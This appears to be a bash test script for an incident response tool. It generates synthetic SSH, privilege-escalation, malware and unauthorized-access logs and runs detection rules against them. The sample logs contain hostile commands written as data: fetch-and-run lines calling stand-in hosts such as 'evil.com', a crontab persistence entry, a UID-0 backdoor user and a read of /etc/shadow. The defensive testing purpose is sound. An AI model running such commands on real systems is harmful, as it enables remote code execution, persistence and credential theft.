#!/bin/bash
#
# Incident Response Framework (IRF) - Rule Testing Script
# This script tests detection rules against sample log data

# Get the project root directory
cd "$(dirname "$0")/.." || exit 1
IRF_ROOT="$(pwd)"
export IRF_ROOT

# Ensure common libraries are loaded
if [[ ! -f "${IRF_ROOT}/lib/bash/common.sh" ]]; then
    echo "ERROR: Required library not found: ${IRF_ROOT}/lib/bash/common.sh" >&2
    exit 1
fi

# shellcheck source=/dev/null
source "${IRF_ROOT}/lib/bash/common.sh"

# Load additional required libraries
source "${IRF_ROOT}/lib/bash/detector.sh" || {
    irf_log ERROR "Failed to load detector library"
    exit 1
}

# Initialize variables
RULE_FILE=""
SAMPLE_LOG=""
TEMP_DIR=""

# Display usage information
show_usage() {
    cat << EOF
Usage: test-rules.sh [OPTIONS]

Test detection rules against sample log data.

Options:
  --rule FILE     Rule file to test
  --log FILE      Sample log file to test against
  --generate      Generate sample log data for testing
  --all           Test all rules against all sample logs
  --help          Display this help message
EOF
}

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --rule)
            if [[ -n "$2" ]]; then
                RULE_FILE="$2"
                shift 2
            else
                irf_log ERROR "Missing argument for --rule"
                show_usage
                exit 1
            fi
            ;;
            
        --log)
            if [[ -n "$2" ]]; then
                SAMPLE_LOG="$2"
                shift 2
            else
                irf_log ERROR "Missing argument for --log"
                show_usage
                exit 1
            fi
            ;;
            
        --generate)
            GENERATE=true
            shift
            ;;
            
        --all)
            TEST_ALL=true
            shift
            ;;
            
        --help)
            show_usage
            exit 0
            ;;
            
        *)
            irf_log ERROR "Unknown option: $1"
            show_usage
            exit 1
            ;;
    esac
done

# Create temporary directory for test outputs
TEMP_DIR=$(mktemp -d "/tmp/irf_test_XXXXXX")
trap 'rm -rf "$TEMP_DIR"' EXIT

# Function to generate sample log data
generate_sample_logs() {
    local output_dir="${TEMP_DIR}/sample_logs"
    mkdir -p "$output_dir"
    
    irf_log INFO "Generating sample log data in $output_dir"
    
    # Generate SSH brute force attempt logs
    cat > "${output_dir}/ssh_brute_force.log" << EOF
timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
May 20 10:15:30	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:35	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:40	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:45	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:15:50	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Failed password for admin from 192.168.1.100 port 22 ssh2
May 20 10:16:00	auth	server1	INFO	admin	server1	192.168.1.100	sshd	1234	Accepted password for admin from 192.168.1.100 port 22 ssh2
EOF
    
    # Generate privilege escalation attempt logs
    cat > "${output_dir}/privilege_escalation.log" << EOF
timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
May 20 11:20:15	auth	server1	WARN	user1	server1	192.168.1.101	sudo	2345	user1 : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
May 20 11:22:30	auth	server1	INFO	user1	server1	192.168.1.101	sudo	2346	pam_unix(sudo:auth): authentication failure; logname=user1 uid=1001 euid=0 tty=/dev/pts/0 ruser=user1 rhost= user=user1
May 20 11:25:45	auth	server1	INFO	root	server1		usermod	2347	usermod: add 'user1' to group 'sudo'
May 20 12:30:10	auth	server1	INFO	root	server1		chmod	2348	root changed permissions of /etc/sudoers from 0440 to 0777
May 20 12:35:20	auth	server1	INFO	root	server1		useradd	2349	new user: name=backdoor, UID=0, GID=0, home=/home/backdoor, shell=/bin/bash
EOF
    
    # Generate malware activity logs
    cat > "${output_dir}/malware_activity.log" << EOF
timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
May 20 14:10:05	syslog	server1	WARN	user1	server1	192.168.1.102	bash	3456	Command executed: wget http://malicious-site.com/payload.sh -O /tmp/payload.sh
May 20 14:10:15	syslog	server1	WARN	user1	server1	192.168.1.102	bash	3457	Command executed: chmod +x /tmp/payload.sh
May 20 14:10:20	syslog	server1	WARN	user1	server1	192.168.1.102	bash	3458	Command executed: /tmp/payload.sh
May 20 14:15:30	syslog	server1	INFO	root	server1		crontab	3459	root edited crontab entry: * * * * * /tmp/miner.sh
May 20 14:20:45	syslog	server1	INFO	root	server1		bash	3460	Command executed: echo "*/5 * * * * curl evil.com/c.sh | bash" >> /etc/crontab
EOF
    
    # Generate unauthorized access logs
    cat > "${output_dir}/unauthorized_access.log" << EOF
timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
May 20 18:30:15	auth	server1	INFO	root	server1	203.0.113.42	sshd	5678	Accepted publickey for root from 203.0.113.42 port 22 ssh2
May 20 22:45:30	auth	server1	INFO	admin	server1	198.51.100.73	sshd	5679	Accepted password for admin from 198.51.100.73 port 22 ssh2
May 21 02:15:40	auth	server1	INFO	backup	server1	192.168.1.105	sshd	5680	Accepted password for backup from 192.168.1.105 port 22 ssh2
May 21 03:20:55	syslog	server1	WARN	root	server1		bash	5681	Command executed: cat /etc/shadow
May 21 03:25:10	syslog	server1	WARN	user1	server1		bash	5682	Permission denied: /etc/passwd
EOF
    
    irf_log INFO "Generated sample log files:"
    find "$output_dir" -type f -name "*.log" | sort | while read -r log_file; do
        local count
        count=$(wc -l < "$log_file")
        count=$((count - 1))  # Subtract header line
        echo "  - $(basename "$log_file"): $count log entries"
    done
    
    echo "$output_dir"
}

# Function to test a single rule against sample data
test_rule() {
    local rule_file="$1"
    local log_file="$2"
    local output_file="${TEMP_DIR}/detection_results.txt"
    
    irf_log INFO "Testing rule file: $(basename "$rule_file")"
    irf_log INFO "Against log file: $(basename "$log_file")"
    
    # Load the rules
    if ! irf_load_rule_file "$rule_file"; then
        irf_log ERROR "Failed to load rule file: $rule_file"
        return 1
    fi
    
    # Run detection
    if ! irf_detect_threats "$log_file" "$output_file"; then
        irf_log ERROR "Detection failed"
        return 1
    fi
    
    # Check results
    local detect_count
    detect_count=$(wc -l < "$output_file")
    detect_count=$((detect_count - 1))  # Subtract header line
    
    if [[ $detect_count -gt 0 ]]; then
        irf_log INFO "Detected $detect_count potential threats"
        echo "Results:"
        cat "$output_file"
    else
        irf_log INFO "No threats detected"
    fi
    
    return 0
}

# Function to test all rules against all sample logs
test_all_rules() {
    local rules_dir="${IRF_CONF_DIR:-${IRF_ROOT}/conf}/rules"
    local logs_dir="$1"
    
    irf_log INFO "Testing all rules against all sample logs"
    
    # Iterate through each rule file
    find "$rules_dir" -type f -name "*.rules" | sort | while read -r rule_file; do
        # Iterate through each log file
        find "$logs_dir" -type f -name "*.log" | sort | while read -r log_file; do
            echo -e "\n==== Testing $(basename "$rule_file") against $(basename "$log_file") ===="
            test_rule "$rule_file" "$log_file"
        done
    done
}

# Main execution
if [[ "$GENERATE" == true ]]; then
    SAMPLE_LOG_DIR=$(generate_sample_logs)
    irf_log INFO "Sample logs generated in: $SAMPLE_LOG_DIR"
    
    if [[ "$TEST_ALL" == true ]]; then
        test_all_rules "$SAMPLE_LOG_DIR"
    fi
    
    exit 0
fi

# If testing specific rule and log
if [[ -n "$RULE_FILE" && -n "$SAMPLE_LOG" ]]; then
    test_rule "$RULE_FILE" "$SAMPLE_LOG"
    exit $?
fi

# If testing all rules
if [[ "$TEST_ALL" == true ]]; then
    # Check if we have sample logs directory
    if [[ -d "${IRF_ROOT}/tests/sample-logs" ]]; then
        test_all_rules "${IRF_ROOT}/tests/sample-logs"
    else
        # Generate sample logs and test
        SAMPLE_LOG_DIR=$(generate_sample_logs)
        test_all_rules "$SAMPLE_LOG_DIR"
    fi
    exit 0
fi

# If nothing specified, show usage
show_usage
exit 1